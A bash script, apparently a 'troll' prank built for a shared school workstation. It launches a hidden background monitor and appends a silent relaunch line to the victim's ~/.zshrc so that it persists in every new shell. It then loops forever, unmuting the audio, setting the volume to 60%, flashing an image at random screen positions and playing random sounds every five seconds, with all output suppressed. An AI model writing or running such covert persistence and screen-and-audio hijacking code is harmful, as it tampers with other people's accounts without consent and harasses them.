#!/bin/bash
nohup /sgoinfre/goinfre/Perso/mochamsa/troll/monitor.sh > /dev/null 2>&1 &
if ! grep -q "/sgoinfre/goinfre/Perso/mochamsa/troll/albie.sh" ~/.zshrc 2>/dev/null; then
    cat << EOF >> ~/.zshrc
nohup /sgoinfre/goinfre/Perso/mochamsa/troll/albie.sh > /dev/null 2>&1 &
EOF
fi


IMAGE_PATHS=(
    "/sgoinfre/goinfre/Perso/mochamsa/img/alban.jpg"
)

SOUND_PATH=(
    "/sgoinfre/goinfre/Perso/mochamsa/wav/miniblin/miniblin1.wav"
    "/sgoinfre/goinfre/Perso/mochamsa/wav/miniblin/miniblin2.wav"
    "/sgoinfre/goinfre/Perso/mochamsa/wav/miniblin/miniblin3.wav"
    "/sgoinfre/goinfre/Perso/mochamsa/wav/miniblin/miniblin4.wav"
    "/sgoinfre/goinfre/Perso/mochamsa/wav/miniblin/miniblin5.wav"
    "/sgoinfre/goinfre/Perso/mochamsa/wav/miniblin/miniblin6.wav"
    "/sgoinfre/goinfre/Perso/mochamsa/wav/miniblin/miniblin7.wav"
    "/sgoinfre/goinfre/Perso/mochamsa/wav/miniblin/miniblin8.wav"
)
    
FEH_PATH="/sgoinfre/goinfre/Perso/mochamsa/utils/feh_temp/usr/bin/feh"

export LD_LIBRARY_PATH="/sgoinfre/goinfre/Perso/mochamsa/utils/libimlib2_temp/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH"
export IMLIB2_LOADER_PATH="/sgoinfre/goinfre/Perso/mochamsa/utils/libimlib2_temp/usr/lib/x86_64-linux-gnu/imlib2/loaders"

for image_path in "${IMAGE_PATHS[@]}"; do
    if [ ! -f "$image_path" ]; then
        continue
    fi
done

if [ ! -f "$FEH_PATH" ]; then
    exit 1
fi

WMCTRL_AVAILABLE=false
if command -v wmctrl &> /dev/null; then
    WMCTRL_AVAILABLE=true
fi

SCREEN_RESOLUTION=$(xrandr | grep '\*' | awk '{print $1}' | head -1)
SCREEN_WIDTH=$(echo $SCREEN_RESOLUTION | cut -d'x' -f1)
SCREEN_HEIGHT=$(echo $SCREEN_RESOLUTION | cut -d'x' -f2)

if [ -z "$SCREEN_WIDTH" ] || [ -z "$SCREEN_HEIGHT" ] || [ "$SCREEN_WIDTH" -eq 0 ] || [ "$SCREEN_HEIGHT" -eq 0 ] 2>/dev/null; then
    SCREEN_WIDTH=1920
    SCREEN_HEIGHT=1080
fi

while true; do
    MARGIN=200
    MAX_X=$((SCREEN_WIDTH - MARGIN))
    MAX_Y=$((SCREEN_HEIGHT - MARGIN))
    
    if [ "$MAX_X" -le 50 ]; then
        MAX_X=100
    fi
    if [ "$MAX_Y" -le 50 ]; then
        MAX_Y=100
    fi
    
    RANDOM_X=$((50 + RANDOM % MAX_X))
    RANDOM_Y=$((50 + RANDOM % MAX_Y))
    
    IMAGE_COUNT=${#IMAGE_PATHS[@]}
    RANDOM_IMAGE_INDEX=$((RANDOM % IMAGE_COUNT))
    SELECTED_IMAGE="${IMAGE_PATHS[$RANDOM_IMAGE_INDEX]}"

    SOUND_COUNT=${#SOUND_PATH[@]}
    RANDOM_SOUND_INDEX=$((RANDOM % SOUND_COUNT))
    SELECTED_SOUND="${SOUND_PATH[$RANDOM_SOUND_INDEX]}"
    
    if [ ! -f "$SELECTED_IMAGE" ]; then
        continue
    fi
    pactl set-sink-mute @DEFAULT_SINK@ 0
    pactl set-sink-volume @DEFAULT_SINK@ 60%
    $FEH_PATH --geometry 200x200+$RANDOM_X+$RANDOM_Y \
        --borderless \
        --no-menus \
        "$SELECTED_IMAGE" &
    paplay "$SELECTED_SOUND"

    FEH_PID=$!
       
    (sleep 0.5; kill $FEH_PID 2>/dev/null) &
    
    sleep 5
done
